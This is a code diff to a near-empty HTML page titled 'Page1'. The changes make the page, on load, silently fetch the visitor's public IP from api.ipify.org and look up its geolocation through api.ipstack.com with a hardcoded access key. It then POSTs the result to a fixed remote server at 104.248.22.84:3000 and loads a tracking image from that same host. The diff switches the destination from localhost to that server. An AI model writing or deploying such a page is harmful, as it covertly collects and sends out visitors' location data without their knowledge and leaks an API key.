@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-	<title>Page</title>
+	<title>Page1</title>
 	<script type="text/javascript">
 		function httpGet(theUrl){
 		    var xmlHttp = new XMLHttpRequest();
@@ -9,26 +9,46 @@
 		    xmlHttp.send( null );
 		    return xmlHttp.responseText;
 		}
+		
+		function go(){
+			var img = document.createElement("img");
+			img.src = "http://104.248.22.84:3000";
+
+			var src = document.body;
+			src.appendChild(img);
+		}
 		function onLoad(){
-			var promise1 = new Promise(function(resolve, reject) {
-				var ip = httpGet('http://ipinfo.io/json');
+			
+			new Promise(function(resolve, reject) {
+				var ip = httpGet('https://api.ipify.org?format=json');
 				if( ip ){
 					resolve(ip);
 				} else {
 					reject();
 				}
-			});
-			promise1.then(function(data){
-				var xhr = new XMLHttpRequest();
-				//var url = 'http://104.248.22.84:3000/post';
-				var url = 'http://127.0.0.1:3000/post';
-				xhr.open('POST', url);
-				xhr.setRequestHeader('Content-Type', 'application/json');
-				xhr.send(data);
+			}).then(function(data){
+				var content = JSON.parse(data);
+				new Promise(function(resolve, reject) {
+					var ip = httpGet(`http://api.ipstack.com/${content.ip}?access_key=218a06772d2629729953a6895c5fb6ff&format=1`);
+					if( ip ){
+						resolve(ip);
+					} else {
+						reject();
+					}
+				}).then(function(data){
+					var xhr = new XMLHttpRequest();
+					var url = 'http://104.248.22.84:3000/post';
+					//url = 'http://127.0.0.1:3000/post';
+					xhr.open('POST', url);
+					xhr.setRequestHeader('Content-Type', 'application/json');
+					xhr.send(data);
+					go();
+				});
 			});
 		}
 	</script>
 </head>
 <body onLoad="onLoad()">
+	<img width='100px' id="img" >
 </body>
 </html>
